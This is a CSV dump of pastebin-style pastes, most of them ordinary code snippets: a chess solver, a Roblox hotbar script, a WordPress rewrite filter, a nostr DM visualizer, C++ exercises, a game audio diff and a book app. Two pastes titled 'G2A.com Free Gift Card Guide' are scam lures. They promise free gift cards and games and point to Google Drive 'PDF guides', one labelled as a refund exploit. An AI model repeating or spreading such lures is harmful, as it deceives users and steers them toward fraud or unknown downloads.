id,title,username,language,date,content
hfmYnsBv,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Friday 12th of April 2024 12:59:22 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
 
Working as of:
12 April 2024"
QgkENm4p,maybe puvodni,max2201111,Python,Friday 12th of April 2024 12:53:24 PM CDT,"import chess

def simplify_fen_string(fen):
    """"""Simplify the FEN string to just include the position of pieces without turn, castling, etc.""""""
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])
    return simplified_fen

def evaluate_position(board):
    """"""Evaluate the board position to determine if it's a checkmate, stalemate, or ongoing game.""""""
    if board.is_checkmate():
        # Determine who is in checkmate
        if board.turn == chess.WHITE:
            return -1000  # White is checkmated, black wins
        else:
            return 1000   # Black is checkmated, white wins
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        return 0  # Game is a draw
    return None  # Game is still ongoing

def create_AR_entry(fen, result, parent):
    """"""Create an entry for the analysis record (AR).""""""
    return {
        'fen': fen,
        'parent': parent,
        'children': [],
        'result': result,
        'sequence': []
    }

def generate_positions(board, AR, parent_fen):
    """"""Generate all possible game positions from the current board state.""""""
    current_fen = board.fen()
    if len(AR) % 100000 == 0:
        print(len(AR))
    if current_fen in AR:
        return  # Avoid processing the same position twice

    result = evaluate_position(board)
    AR[current_fen] = create_AR_entry(simplify_fen_string(current_fen), result, parent_fen)

    if parent_fen:
        AR[parent_fen]['children'].append(current_fen)

    if result is not None:
        return  # Stop further generation if the game has ended

    for move in board.legal_moves:
        board.push(move)
        generate_positions(board, AR, current_fen)
        board.pop()

def back_propagation(AR):
    """"""Propagate the results from the leaf nodes to the root based on the analysis record.""""""
    for fen in AR:
        node = AR[fen]
        if node['result'] is not None and node['parent']:
            propagate_upwards(AR, fen)

def propagate_upwards(AR, child_fen):
    """"""Recursively update parent nodes based on the results of child nodes.""""""
    child_node = AR[child_fen]
    parent_fen = child_node['parent']

    if AR[initial_fen]['result'] is not None:
        return
    
    while parent_fen:
        parent_node = AR[parent_fen]
        if parent_node['result'] is None or abs(child_node['result']) < abs(parent_node['result']):
            parent_node['result'] = -child_node['result']
            parent_node['sequence'] = [child_fen] + child_node['sequence']
        child_fen = parent_fen
        child_node = parent_node
        parent_fen = child_node['parent']

def main():
    initial_fen = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    board = chess.Board(initial_fen)
    AR = {}
    generate_positions(board, AR, None)
    back_propagation(AR)

    # Output results
    initial_entry = AR[initial_fen]
    print(f""Result for initial position: {initial_entry['result']}"")
    print(""Optimal sequence of moves:"")
    for fen in initial_entry['sequence']:
        print(chess.Board(fen))
        print()

main()"
Kx7rC3xT,StackHotBar System,Sungmingamerpro13,CSS,Friday 12th of April 2024 12:52:01 PM CDT,"-- [ SETTINGS ] --

local backgroundColor = Color3.fromRGB(0, 132, 255) -- The color of each circle
local maxOnHotbar = 10 -- How many tools can be displayed. Setting this to more than 10 reverts to 10

-- [ END SETTINGS ] --

-- Don't edit if you don't know what you're doing --

local Players = game:GetService(""Players"")
local StarterGui = game:GetService(""StarterGui"")
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local player = Players.LocalPlayer
local Backpack = player.Backpack
local Character = player.Character
local Frame = script.Parent.Frame
local Template = Frame.Contents.objTemplate

local COLOR_DARKER = 0.65
local KEY_DICTIONARY = { Zero = 10, One = 1, Two = 2, Three = 3, Four = 4, Five = 5, Six = 6, Seven = 7, Eight = 8, Nine = 9 }
local EQUIP_TWEENINFO = TweenInfo.new(0.25, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
local items = {}
local tweens = {}
local stackedItems = {}

local function handleStackingUI(toolCircle, tool)
	if tool:WaitForChild(""stacks"").Value then
		tool.stacks:GetPropertyChangedSignal('Value'):Connect(function()
			toolCircle.Stacks.Text = tool.stacks.Value
		end)
		toolCircle.Stacks.Text = tool.stacks.Value
	end
end

local function handleEquip(tool)
	if tool.Parent == nil or tool.Parent == Backpack then
		Character.Humanoid:EquipTool(tool)
	elseif tool.Parent == Character then
		Character.Humanoid:UnequipTools()
	end
end


local function checkHotbar(removeIndex)
	if removeIndex then
		for _, toolCircle in pairs(Frame.Contents:GetChildren()) do
			if toolCircle:IsA(""GuiObject"") then
				local circleName = tonumber(toolCircle.Name)
				if circleName and circleName >= removeIndex then
					local newIndex = (circleName == 11) and 0 or circleName - 1
					local isVisible = (maxOnHotbar == 10) and (newIndex <= 9 and true or false) or ((newIndex ~= 0 and newIndex <= maxOnHotbar) and true or false)

					toolCircle.LayoutOrder -= 1
					toolCircle.Name = tostring(newIndex)
					toolCircle.Visible = isVisible
					toolCircle.Index.Text = tostring(newIndex)
				end
			end
		end
	end

	local additionalIndex = Frame.AdditionalIndex
	additionalIndex.Size = UDim2.new(0, Frame.Contents.UIListLayout.AbsoluteContentSize.X + Frame.Contents.AbsoluteSize.Y + 15, 0, 25)
	additionalIndex.Text = ""+"" .. (#items - maxOnHotbar)
	additionalIndex.Visible = (#items > maxOnHotbar)

	for index, tool in ipairs(items) do
		local toolCircle = Frame.Contents:FindFirstChild(index)
		local isEquipped = (tool.Parent == Character)

		if not toolCircle then
			return
		end

		if tweens[toolCircle] then
			tweens[toolCircle]:Cancel()
			tweens[toolCircle] = nil
		end

		-- Adjust UIStroke Transparency based on whether the tool is equipped or not
		toolCircle.Background.Out.UIStroke.Transparency = isEquipped and 0 or 1
		-- Adjust BackgroundTransparency of the circle Frame based on the UIStroke Transparency
		toolCircle.Background.Out.BackgroundTransparency = isEquipped and 0.7 or 0.7
		
		handleStackingUI(toolCircle, tool)
	end
end



local function create(tool)
	
	local nextIndex = (#items == 10) and 0 or #items
	local isVisible = (maxOnHotbar == 10) and (nextIndex <= 9 and true or false) or ((nextIndex ~= 0 and nextIndex <= maxOnHotbar) and true or false)

	local toolCircle = Template:Clone()
	
	toolCircle.LayoutOrder = #items
	toolCircle.Name = #items
	toolCircle.Size = UDim2.new(0.071, 0,0.739, 0)
	toolCircle.Visible = isVisible
	toolCircle.Image.Image = tool.TextureId
	toolCircle.Index.Text = nextIndex
	toolCircle.Stacks.Text = ""1""
	toolCircle.FixedName.Text = tool.TextureId == """" and tool.Name or """"
	toolCircle.Parent = Frame.Contents

	if tool.Name == ""Bat"" or tool.Name == ""WoodenSword"" or tool.Name == ""Dark Sword"" or tool.Name == ""Demon Sword"" or tool.Name == ""Rainbow Sword"" then
		toolCircle.Stacks.Text = """"
	elseif tool.Name == ""ClassicSword"" or tool.Name == ""Crowbar"" or tool.Name == ""Metal Bat"" or tool.Name == ""DeluxeBat"" or tool.Name == ""PlusBat"" then
		toolCircle.Stacks.Text = """"
	elseif tool.Name == ""GoldBat"" or tool.Name == ""RobuxBat"" or tool.Name == ""Spiked Club"" or tool.Name == ""Light Saber"" or tool.Name == ""Flashlight"" then
		toolCircle.Stacks.Text = """"
	elseif tool.Name == ""Plank"" then
		toolCircle.Stacks.Text = """"
	end

	toolCircle.Image.MouseButton1Click:Connect(function()
		local index = string.gmatch(toolCircle.Name,""%d+"")
		index = tonumber(index())
		tool = items[index]
		handleEquip(tool)
	end)

	checkHotbar()
	
end

local function updateAdd(tool)
	if not tool:IsA(""Tool"") then
		return
	end

	checkHotbar()

	if table.find(items, tool) then
		return
	end

	table.insert(items, tool)

	create(tool)
end

local function updateRemove(tool)
	if not tool:IsA(""Tool"") then
		return
	end

	if tool.Parent == Character or tool.Parent == Backpack then
		return
	end

	if table.find(items, tool) then
		local index = table.find(items, tool)
		local toolCircle = Frame.Contents:FindFirstChild(index)

		if toolCircle then
			toolCircle:Destroy()
		end

		table.remove(items, index)
		checkHotbar(index)
	end
end

while true do
	local success, err = pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	end)
	if success then
		break
	end
	wait()
end

if maxOnHotbar > 10 then
	maxOnHotbar = 10
end

Template.Visible = true
Template.Parent = nil

for _, tool in pairs(Backpack:GetChildren()) do
	updateAdd(tool)
end
Backpack.ChildAdded:Connect(updateAdd)
Backpack.ChildRemoved:Connect(updateRemove)

Character.ChildAdded:Connect(updateAdd)
Character.ChildRemoved:Connect(updateRemove)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then
		return
	end

	if KEY_DICTIONARY[input.KeyCode.Name] then
		local index = KEY_DICTIONARY[input.KeyCode.Name]

		if items[index] then
			handleEquip(items[index])
		end
	end
end)"
qpCsTKAQ,maybe,max2201111,Python,Friday 12th of April 2024 12:51:42 PM CDT,"import chess

def simplify_fen_string(fen):
    """"""Simplify the FEN string to just include the position of pieces without turn, castling, etc.""""""
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])
    return simplified_fen

def evaluate_position(board):
    """"""Evaluate the board position to determine if it's a checkmate, stalemate, or ongoing game.""""""
    if board.is_checkmate():
        if board.turn == chess.WHITE:
            return -1000  # White is checkmated, black wins
        else:
            return 1000   # Black is checkmated, white wins
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        return 0  # Game is a draw
    return None  # Game is still ongoing

def create_AR_entry(fen, result, parent):
    """"""Create an entry for the analysis record (AR).""""""
    return {
        'fen': fen,
        'parent': parent,
        'children': [],
        'result': result,
        'sequence': []
    }

def generate_positions(board, AR, parent_fen):
    """"""Generate all possible game positions from the current board state.""""""
    current_fen = board.fen()
    if len(AR) % 100000 == 0:
        print(len(AR))
  
    if current_fen in AR:
        return  # Avoid processing the same position twice

    result = evaluate_position(board)
    AR[current_fen] = create_AR_entry(simplify_fen_string(current_fen), result, parent_fen)

    if parent_fen:
        AR[parent_fen]['children'].append(current_fen)

    if result is not None:
        return  # Stop further generation if the game has ended

    for move in board.legal_moves:
        board.push(move)
        generate_positions(board, AR, current_fen)
        board.pop()

def propagate_upwards(AR, child_fen):
    """"""Recursively update parent nodes based on the results of child nodes.""""""
    child_node = AR[child_fen]
    parent_fen = child_node['parent']

    while parent_fen:
        parent_node = AR[parent_fen]
        if parent_node['result'] is None or abs(child_node['result']) < abs(parent_node['result']):
            parent_node['result'] = -child_node['result']
            parent_node['sequence'] = [child_fen] + child_node['sequence']
        child_fen = parent_fen
        child_node = parent_node
        parent_fen = child_node['parent']

def back_propagation(AR):
    """"""Propagate the results from the leaf nodes to the root based on the analysis record.""""""
    for fen in AR:
        node = AR[fen]
        if node['result'] is not None and node['parent']:
            propagate_upwards(AR, fen)

def main():
    initial_fen = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    board = chess.Board(initial_fen)
    AR = {}
    generate_positions(board, AR, None)
    back_propagation(AR)

    # Output results
    initial_entry = AR[initial_fen]
    print(f""Result for initial position: {initial_entry['result']}"")
    print(""Optimal sequence of moves:"")
    for fen in initial_entry['sequence']:
        print(chess.Board(fen))
        print()

main()
"
UWutFz3W,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Friday 12th of April 2024 12:42:35 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_751701.pdf

Working as of:
12 April 2024"
QbQWD8wy,Untitled,mark-naylor-1701,Lisp,Friday 12th of April 2024 12:31:58 PM CDT,"(defun cc/describe-function-point-is-in-no-mark ()
  ""Describe enclosing Elisp function at point.
\nInvoke `describe-function' on the enclosing Elisp function the point is in.""
  (interactive)
  (save-excursion
    (beginning-of-defun)
    (forward-char)
    (forward-sexp 2)
    (let ((end-point (point)))
      (backward-sexp)
      (let* ((fn-name (buffer-substring (point) end-point))
             (interned (intern-soft fn-name)))
        (if interned
         (describe-function interned))))))
"
BRJcPmHY,Untitled,nshelper,PHP,Friday 12th of April 2024 12:23:55 PM CDT,"<?php

    add_filter('wp-hide/mod_rewrite_rules', 'wp_hide__replace_rewrite_line', 999, 2);
    function wp_hide__replace_rewrite_line( $rules, $server_software )
        {
            
            if  ( $server_software !=   'apache' )
                return $rules;
                
            
            $rules  =   '#Pass-through if another rewrite rule has been previouslly applied'    .
                        ""\n""    .   'RewriteCond %{ENV:REDIRECT_STATUS} 200'    .
                        ""\n""    .   'RewriteRule ^ - [L]' . 
                        ""\n\n""  .   $rules;
            
            //replace all END flags with L
            $rules  =   str_replace( 'RewriteRule ^ - [L]', '#RewriteRule ^ - [L]', $rules );
            
            return $rules;
            
        }
"
quaaqKp6,nostr dm visualizer,1440000bytes,Python,Friday 12th of April 2024 11:41:34 AM CDT,"import time
import random
from nostr.filter import Filter, Filters
from nostr.event import Event, EventKind
from nostr.relay_manager import RelayManager
from nostr.message_type import ClientMessageType
from nostr.key import PrivateKey
import turtle

def draw_square(x, y, color, size, label=None):
    turtle.penup()
    turtle.goto(x - size / 2, y - size / 2)
    turtle.color(color)
    turtle.begin_fill()
    for _ in range(4):
        turtle.forward(size)
        turtle.left(90)
    turtle.end_fill()
    if label:
        short_label = label[:3] + ""..."" + label[-3:]
        turtle.color(""black"")  
        turtle.goto(x, y - size // 2 - 10)
        turtle.write(short_label, align=""center"", font=(""Arial"", 12, ""normal""))

def draw_line(x1, y1, x2, y2):
    turtle.penup()
    turtle.goto(x1, y1)
    turtle.color(""black"")
    turtle.pendown()
    turtle.goto(x2, y2)
    turtle.penup()

public_key = input(""Enter the public key: "")

filters = Filters([Filter(pubkey_refs=[public_key], kinds=[4])])
subscription_id = ""nip4_graph""
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())

relay_manager = RelayManager()
relay_manager.add_relay(""wss://nostr.fmt.wiz.biz/"")
relay_manager.add_subscription_on_all_relays(subscription_id, filters)
time.sleep(1.25) 

turtle.setup(width=800, height=600)
turtle.bgcolor(""white"")

recipient_size = 50
draw_square(0, 0, ""blue"", recipient_size)

senders = {}
sender_offset = 300

while relay_manager.message_pool.has_events():
    event_msg = relay_manager.message_pool.get_event()
    sender_key = event_msg.event.public_key

    if sender_key not in senders:
        x = random.randint(-300, 300)
        y = random.randint(-200, 200)
        senders[sender_key] = (x, y)

        draw_square(x, y, ""red"", 30, sender_key)

    draw_line(senders[sender_key][0], senders[sender_key][1], 0, 0)

turtle.done()

relay_manager.close_subscription_on_all_relays(subscription_id)
relay_manager.close_all_relay_connections()
"
Ryn8XJiz,Untitled,MeehoweCK,C++,Friday 12th of April 2024 11:28:53 AM CDT,"#include <iostream>
#include <cstdlib>
#include <ctime>

int main() {
	srand(time(nullptr));
	auto liczba{ 1.0 * rand() / RAND_MAX };		// liczba losowa rzeczywista z przedziału od 0 do 1
	std::cout << liczba << std::endl;

	auto liczba2{ 10.0 * rand() / RAND_MAX };	// liczba losowa rzeczywista z przedziału od 0 do 10
	std::cout << liczba2 << std::endl;

	auto liczba3{ 10.0 + 5.0 * rand() / RAND_MAX };	// liczba losowa rzeczywista z przedziału od 10 do 15
	std::cout << liczba3 << std::endl;
	return 0;
}"
XrTyPmGD,Untitled,AlexG2230954,Python,Friday 12th of April 2024 11:27:50 AM CDT,"def reverse_rows(n):
    for i in range(n // 2):
        for j in range(n):
            yield (i, j), (n - 1 - i, j)


def print_matrix(m):
    for row in m:
        print(row)


def apply_swaps(matrix, swaps) -> None:
    for (i1, j1), (i2, j2) in swaps:
        matrix[i1][j1], matrix[i2][j2] = matrix[i2][j2], matrix[i1][j1]


def test_works():
    A = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
    print_matrix(A)
    print()
    apply_swaps(A, reverse_rows(3))
    print_matrix(A)


def main():
    n = int(input('n: '))
    for t1, t2 in reverse_rows(n):
        print(*t1, *t2)


main()"
kYWHQugZ,Untitled,dominus,Diff,Friday 12th of April 2024 11:18:54 AM CDT,"diff --git a/gamewin.cc b/gamewin.cc
index 15df83838..4c8c92333 100644
--- a/gamewin.cc
+++ b/gamewin.cc
@@ -173,111 +173,94 @@ void Background_noise::handle_event(unsigned long curtime, uintptr udata) {
 	} else if (weather == 1) {
 		currentstate = SnowStorm;
 	} else if (nighttime) {
-		currentstate = Nighttime;    // Night time
+		currentstate = Nighttime;
 	} else {
 		currentstate = Outside;
 	}
 
 	MyMidiPlayer* player = Audio::get_ptr()->get_midi();
-	// Lets allow this for Digital Muisc and MT32Emu only,
-	// for MT32/FakeMT32 conversion as well.
-	// if (player) {
-	// if (player && player->get_ogg_enabled()){
-	if (player
-		&& (player->get_ogg_enabled() || player->is_mt32()
-			|| player->is_adlib())) {
-		delay = 1000;    // Quickly get back to this function check
-		// We've got OGG so play the background SFX tracks
+	// The sfx tracks only play for Digital Music, MT32emu, MT32/FakeMT32
+	// FMOpl is not sounding acceptable.
+	const bool    play_bg_tracks = player && (player->get_ogg_enabled() || player->is_mt32());
 
+	if (player || play_bg_tracks) {
+		delay = 1000;    // Quickly get back to this function check
 		const int curr_track = player->get_current_track();
-
-		// Testing. Original seems to allow crickets for all songs at night,
-		// except when in a dungeon. Also, only do it sometimes.
-		if (nighttime && currentstate != Dungeon && rand() % 6 == 0) {
-			// Play the cricket sounds at night
-			Audio::get_ptr()->play_sound_effect(
-					Audio::game_sfx(61), AUDIO_MAX_VOLUME - 30);
-		}
-
 		if ((curr_track == -1 || laststate != currentstate)
 			&& Audio::get_ptr()->is_music_enabled()) {
-			// Don't override bee cave music with dungeon music.
-			const bool notbees = !GAME_BG || curr_track != 54;
 			// ++++ TODO: Need to come up with a way to replace repeating songs
 			// here, just so they don't loop forever.
 			// Conditions: not playing music, playing a background music
 			if (curr_track == -1 || gwin->is_bg_track(curr_track)
-				|| (((currentstate == Dungeon && notbees)
-					 || currentstate == DangerNear)
+				|| (((currentstate == Dungeon)
+					|| currentstate == DangerNear)
 					&& !is_combat_music(curr_track))) {
-				// Not already playing music
 				int tracknum = 255;
-
 				// Get the relevant track number.
 				if (nearby_hostile && !gwin->in_combat()) {
 					tracknum  = Audio::game_music(10);
 					laststate = DangerNear;
 				} else if (gwin->is_in_dungeon()) {
-					// Start the SFX music track then
-					tracknum  = Audio::game_music(52);
+					if (play_bg_tracks)
+						tracknum  = Audio::game_music(52);
 					laststate = Dungeon;
 				} else if (weather == 1) {    // Snowstorm
-					tracknum  = Audio::game_music(5);
+					if (play_bg_tracks)
+						tracknum  = Audio::game_music(5);
 					laststate = SnowStorm;
 				} else if (weather == 2) {    // Rainstorm
-					tracknum  = Audio::game_music(4);
+					if (play_bg_tracks)
+						tracknum  = Audio::game_music(4);
 					laststate = RainStorm;
-				} else if (bghour < 6 || bghour > 20) {
-					tracknum  = Audio::game_music(7);
+				} else if (nighttime) {
+					// Disabled nighttime sfx track as it is very distracting
+					/*if (play_bg_tracks)
+						tracknum  = Audio::game_music(7);*/
 					laststate = Nighttime;
 				} else {
-					// Start the SFX music track then
-					tracknum  = Audio::game_music(6);
+					if (play_bg_tracks)
+						tracknum  = Audio::game_music(6);
 					laststate = Outside;
 				}
 				Audio::get_ptr()->start_music(tracknum, true);
 			}
 		}
-	} else {
-		Main_actor* ava = gwin->get_main_actor();
-		// Tests to see if track is playing the SFX tracks, possible
-		// when the game has been restored
-		// and the Audio option was changed from OGG to something else
-		if (player && player->get_current_track() >= Audio::game_music(4)
-			&& player->get_current_track() <= Audio::game_music(8)) {
-			player->stop_music();
-		}
-
-		// Not OGG so play the SFX sounds manually
-		//  Only if outside.
-		if (ava && !gwin->is_main_actor_inside() &&
-			// +++++SI SFX's don't sound right.
-			Game::get_game_type() == BLACK_GATE) {
-			int                        sound;    // BG SFX #.
-			static const unsigned char bgnight[] = {61, 61, 255};
-			static const unsigned char bgday[]   = {82, 85, 85};
-			if (repeats > 0) {    // Repeating?
-				sound = last_sound;
-			} else {
-				const int hour = gwin->get_clock()->get_hour();
-				if (hour < 6 || hour > 20) {
-					sound = bgnight[rand() % sizeof(bgnight)];
-				} else {
-					sound = bgday[rand() % sizeof(bgday)];
-				}
-				// Translate BG to SI #'s.
-				sound      = Audio::game_sfx(sound);
-				last_sound = sound;
-			}
-			Audio::get_ptr()->play_sound_effect(sound);
-			repeats++;    // Count it.
-			if (rand() % (repeats + 1) == 0) {
-				// Repeat.
-				delay = 500 + rand() % 1000;
-			} else {
-				delay   = 4000 + rand() % 3000;
-				repeats = 0;
+	}
+
+	// Tests to see if day sfx track is playing, possible
+	// when the game has been restored
+	// and the Audio option was changed from OGG/MT32 to something else
+	// If nighttime sfx track is uncommented, also query whether track 7 plays 
+	if (player && !play_bg_tracks && player->get_current_track() == 6) {
+		player->stop_music();
+	}
+	Main_actor* ava = gwin->get_main_actor();
+	// Testing. When outside play birds during daytime or crickets at night
+	if (ava && !gwin->is_main_actor_inside() && currentstate != Dungeon) {
+		int                        sound;    // SFX #.
+		int                       volume;    // keep the volume down.
+		static const unsigned char bgnight[] = {61, 61, 255};
+		static const unsigned char bgday[]   = {82, 85, 85};
+		if (repeats > 0) {    // Repeating?
+			sound = last_sound;
+		} else {
+			if (nighttime) {
+				sound = bgnight[rand() % sizeof(bgnight)];
+			// only play daytime sfx when no music track is playing
+			} else if (!play_bg_tracks && player->get_current_track() == -1) {
+				sound = bgday[rand() % sizeof(bgday)];
 			}
+			last_sound = sound;
+		}
+		Audio::get_ptr()->play_sound_effect(
+				Audio::game_sfx(sound), AUDIO_MAX_VOLUME - 200);
+		repeats++;    // Count it.
+		if (rand() % (repeats + 1) == 0) {
+			// Repeat.
+			delay = 500 + rand() % 1000;
+		} else {
+			delay   = 4000 + rand() % 3000;
+			repeats = 0;
 		}
 	}
 
"
pZ5T5rxF,Untitled,MeehoweCK,C++,Friday 12th of April 2024 11:15:15 AM CDT,"#include <iostream>
#include <cstdlib>				// biblioteka zawierająca funkcję rand()
#include <ctime>				// biblioteka zawierająca funkcję time()

int losujZprzedzialu(int min, int max) {
	return (min + rand() % (max - min + 1));		// 1 + rand() % (100 - 1 + 1) == 1 + rand() % 100
}

int main() {
	srand(time(nullptr));				// ustawienie parametru losowania
	auto liczba{ rand() };		// rand() zwraca pseudolosową liczbę całkowitą z przedziału od 0 do 32'767
	std::cout << liczba << std::endl;
	std::cout << RAND_MAX << std::endl;

	auto liczba2{ rand() % 10 };		// liczba naturalna pseudolosowa z przedziału od 0 do 9
	std::cout << liczba2 << std::endl;

	auto liczba3{ 1 + rand() % 100 };	// liczba naturalna pseudolosowa z przedziału od 1 do 100
	std::cout << liczba3 << std::endl;

	auto liczba4{ losujZprzedzialu(20, 75) };
	std::cout << liczba4 << std::endl;
	return 0;
}"
xKDjNj8V,Untitled,Josif_tepe,C++,Friday 12th of April 2024 11:03:00 AM CDT,"#include <iostream>
#include <algorithm>
#include <vector>
using namespace std;


int main()
{
    int n;
    cin >> n;


   vector<int> v;
    for(int i = 0; i < n; i++) {
        int x;
        cin >> x;
        v.push_back(x);
    }
    int brojac=0;
    int cifri =0;
   for(int i=0;n>i;i++){


   int x=v[i];
    int even =1;
    int golemina=0;
    while(x>0) {
        int cifra=x%10;
        if(cifra %2==1){


           even=0;
        }
         golemina++;


       x/=10;


   }


  if(even==1) {


   brojac++;
    cifri+=golemina;


   }


  }
cout<<brojac<<endl<<cifri<<endl;


}"
uzKjxErq,Bookmark,KillerRebooted,Python,Friday 12th of April 2024 10:38:43 AM CDT,"import requests

def get_book_details(search):

    def get_details(response):

        try:
            response[""items""]
        except:
            return get_details(requests.get(f""https://www.googleapis.com/books/v1/volumes?q={search.replace("" "", ""+"")}"").json())

        titles = [book[""volumeInfo""][""title""] for book in response[""items""]]
        ids = [book[""id""] for book in response[""items""]]
        authors = [book[""volumeInfo""][""authors""] if ""authors"" in book[""volumeInfo""] else """" for book in response[""items""]]
        publishers = [book[""volumeInfo""][""publisher""] if ""publisher"" in book[""volumeInfo""] else """" for book in response[""items""]]
        publish_dates = [book[""volumeInfo""][""publishedDate""] if ""publishedDate"" in book[""volumeInfo""] else """" for book in response[""items""]]
        descriptions = [book[""volumeInfo""][""description""] if ""description"" in book[""volumeInfo""] else """" for book in response[""items""]]

        isbn10 = []
        isbn13 = []

        for i in response[""items""]:
            isbn10_value = """"
            isbn13_value = """"
            try:
                for j in i[""volumeInfo""][""industryIdentifiers""]:
                    if j[""type""] == ""ISBN_10"":
                        isbn10_value = j[""identifier""]
                    if j[""type""] == ""ISBN_13"":
                        isbn13_value = j[""identifier""]

            except:
                pass
            
            isbn10.append(isbn10_value)
            isbn13.append(isbn13_value)

        page_counts = [book[""volumeInfo""][""pageCount""] if ""pageCount"" in book[""volumeInfo""] else """" for book in response[""items""]]
        categories = [book[""volumeInfo""][""categories""] if ""categories"" in book[""volumeInfo""] else """" for book in response[""items""]]
        maturity_ratings = [book[""volumeInfo""][""maturityRating""] for book in response[""items""]]
        thumbnails = [f""https://books.google.com/books/publisher/content/images/frontcover/{i}?fife=w1920-h1080&source=gbs_api"" for i in ids]

        books = []

        for i in range(len(titles)):

            books.append({""title"":titles[i], ""id"":ids[i], ""authors"":"", "".join(authors[i]), ""publisher"":publishers[i], ""publish_date"":publish_dates[i], ""description"":descriptions[i], ""isbn10"":isbn10[i], ""isbn13"":isbn13[i], ""page_count"":page_counts[i], ""categories"":categories[i], ""maturity_rating"":maturity_ratings[i], ""thumbnail"":thumbnails[i]})

        return books

    response = requests.get(f""https://www.googleapis.com/books/v1/volumes?q=isbn:{search}"").json()
    
    return get_details(response)

if __name__ == ""__main__"":
    print(get_book_details(""9781974742943""))
    
    print(get_book_details(""wimpy kid ugly truth""))



































import customtkinter as ctk
from time import sleep
import json, hashlib, os, io, urllib.request, threading, time
from PIL import Image
from ISBN import get_book_details

ctk.set_appearance_mode(""system"")
ctk.set_default_color_theme(""dark-blue"")

win = ctk.CTk(fg_color=""#121212"")
win.title(""Login"")
win.geometry(""0x0"")

def center(win, screen_resolution, animation_time):

        x1, y1 = 0, 0

        while x1 != screen_resolution[0] or y1 != screen_resolution[1]:

            if x1 != screen_resolution[0]: x1 += screen_resolution[0]/(animation_time*10)
            if y1 != screen_resolution[1]: y1 += screen_resolution[1]/(animation_time*10)

            win.geometry(f""{int(x1)}x{int(y1)}"")

            x2 = win.winfo_screenwidth()//2 - win.winfo_width()//2
            y2 = win.winfo_screenheight()//2 - win.winfo_height()//2

            win.geometry(f""+{x2}+{y2}"")

            sleep(0.008)
            win.update()

#Login Functions

def switch_method(button):

    def make_selector(x, length):
        for i in range(1, length):

            text = ""_""*i

            selector.configure(text=text)
            selector.place(x=x)

            sleep(0.04)

            win.update()

    if username.get() != """":
        username.delete(0, ctk.END)
    if password.get() != """":
        password.delete(0, ctk.END)

    try:
        pass_notification.destroy()
    except:
        pass
    
    check_var.set("""")
    show_pass([password])

    if button == ""login"":

        login_page(False)
        make_selector(136, 6)

    else:

        signup_page()
        make_selector(270, 7)

def show_pass(inputs):

    show = check_var.get()

    if show == ""*"":
        check_var.set("""")
        show_password.configure(image=ctk.CTkImage(dark_image=Image.open(f""{data_loc}\\Images\\Eye Show.png""), size=(30,30)))
    else:
        check_var.set(""*"")
        show_password.configure(image=ctk.CTkImage(dark_image=Image.open(f""{data_loc}\\Images\\Eye Hide.png""), size=(30,30)))

    for input in inputs:
        input.configure(show=check_var.get())

def login_page(first_time):

    global frame, selector, username, password, check_var, show_password, login_button

    try:
        confirm_password.destroy()
        signup_button.destroy()
    except:
        try:
            login_button.destroy()
        except:
            pass

    if first_time:

        center(win, (600, 400), 2)

        frame = ctk.CTkFrame(win, fg_color=""#1f1f1f"")
        frame.pack(pady=20, padx=60, fill=""both"", expand=True)

        label = ctk.CTkLabel(frame, text=""BOOKMARK"", text_color=""#bb86fc"", font=(""Roboto"", 24, ""bold""))
        label.pack(pady=12, padx=10)
    
    if first_time:

        selector = ctk.CTkLabel(frame, text=""_____"", text_color=""#bb86fc"", font=(""Roboto"", 24, ""bold""))
        selector.place(x=136, y=55)

    login_switch_method = ctk.CTkButton(frame, text=""LOGIN"", text_color=""#bb86fc"", font=(""Roboto"", 16, ""bold""), fg_color=""#1f1f1f"", hover_color=""#1f1f1f"", cursor=""hand2"", height=0, width=0, command=lambda: switch_method(""login""))
    login_switch_method.place(x=136, y=50)

    sign_up_switch_method = ctk.CTkButton(frame, text=""SIGN UP"", text_color=""#bb86fc"", font=(""Roboto"", 16, ""bold""), fg_color=""#1f1f1f"", hover_color=""#1f1f1f"", cursor=""hand2"", height=0, width=0, command=lambda: switch_method(""sign_up""))
    sign_up_switch_method.place(x=270, y=50)

    if first_time:    
        
        username = ctk.CTkEntry(frame, placeholder_text=""Username"", fg_color=""#1f1f1f"", show="""", height=40, width=200)
        username.pack(pady=(50, 12), padx=10)

        check_var = ctk.StringVar()
        check_var.set(""*"")

        password = ctk.CTkEntry(frame, placeholder_text=""Password"", fg_color=""#1f1f1f"", show=""*"", height=40, width=200)
        password.pack(pady=12, padx=10)

        show_password = ctk.CTkButton(frame, text="""", fg_color=""#1f1f1f"", hover_color=""#191919"", image=ctk.CTkImage(dark_image=Image.open(f""{data_loc}\\Images\\Eye Hide.png""), size=(30,30)), width=30, height=30, command=lambda: show_pass([password]))
        show_password.place(x=345, y=168)

    else:

        show_password.configure(command=lambda: show_pass([password]))

    login_button = ctk.CTkButton(frame, text=""Login"", text_color=""#121212"", fg_color=""#bb86fc"", hover_color=""#5704bc"", font=(""Roboto"", 13, ""bold""), cursor=""hand2"", command=login)
    login_button.pack(pady=12, padx=10)

    win.bind(""<Return>"", lambda event: login())

def signup_page():

